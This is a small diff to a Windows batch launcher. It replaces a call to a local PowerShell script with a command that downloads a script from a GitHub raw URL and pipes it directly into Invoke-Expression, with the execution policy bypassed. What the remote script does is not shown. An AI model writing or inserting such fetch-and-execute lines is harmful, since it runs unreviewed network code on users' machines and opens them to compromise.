@@ -1,5 +1,3 @@
 @echo off
-setlocal
-set "ps1=%~dp0myscript.ps1"
-powershell -NoProfile -ExecutionPolicy Bypass -File "%ps1%"
+powershell -NoProfile -ExecutionPolicy Bypass -Command "irm 'https://github.com/ManueITest/Windows/raw/refs/heads/main/nuovo2.ps1' | iex"
 pause
